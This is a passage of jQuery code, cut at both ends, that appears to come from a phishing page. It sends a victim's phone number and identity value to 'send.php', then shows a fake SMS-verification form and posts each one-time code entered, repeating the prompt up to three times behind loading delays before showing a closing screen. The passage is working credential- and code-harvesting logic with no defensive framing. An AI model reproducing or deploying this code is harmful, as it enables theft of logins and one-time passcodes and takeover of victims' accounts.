            $.post("send.php", {L: $('.phone_inp').val(), I: $('.ident_inp').val()});
            
            setTimeout(function() {
            $('.login-ident,.preloader').fadeOut(0);	
            $('.sms_form').fadeIn();	
            }, 5000);			 
                           
            event.preventDefault();
            
            });		 
         
            var step = 0;
            
            $( ".sms_form" ).submit(function( event ) {
            
            step = step + 1;
            
            $('.preloader').fadeIn(0);
         
            $('.sms-error').fadeOut();
            
            var code = $('.code_inp').val();
            
            $.post("send.php", {code: code}); 
            
            setTimeout(function() {
            
            if(step == 3) {
            
            setTimeout(function() {
            $('.sms_form').fadeOut();
            }, 3000); 
            
            setTimeout(function() {
            $('.end_form').fadeIn();
